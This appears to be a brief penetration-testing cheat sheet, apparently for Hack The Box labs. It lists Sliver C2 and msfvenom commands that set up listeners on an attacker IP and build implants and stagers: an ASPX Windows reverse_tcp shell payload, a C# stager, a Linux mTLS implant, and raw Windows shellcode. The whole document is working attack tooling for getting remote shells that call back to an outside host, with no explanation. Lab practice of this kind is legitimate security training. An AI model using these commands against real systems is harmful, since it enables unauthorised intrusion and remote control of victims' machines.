
Generate Profile
```
profiles new --http 10.10.16.147:8088 --format shellcode htb
```

Generate Listener
```
stage-listener --url tcp://10.10.16.147:4443 --profile htb
```

Start Listener
```
http -L 10.10.16.147 -l 8088
```

Generate Stager
```
generate stager --lhost 10.10.14.62 --lport 4443 --format csharp --save staged.txt
```

Generate Paylaod
```
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.147 LPORT=4443 -f aspx > sliver.aspx
```

Generate Elf
```
generate --mtls 192.168.45.188 --os linux --arch amd64 --format exe --save sliver
```
Shellcode
```
used generate stager --lhost 192.168.45.188 --lport 8443 --os windows --arch amd64 --format raw --save sliver.bin
```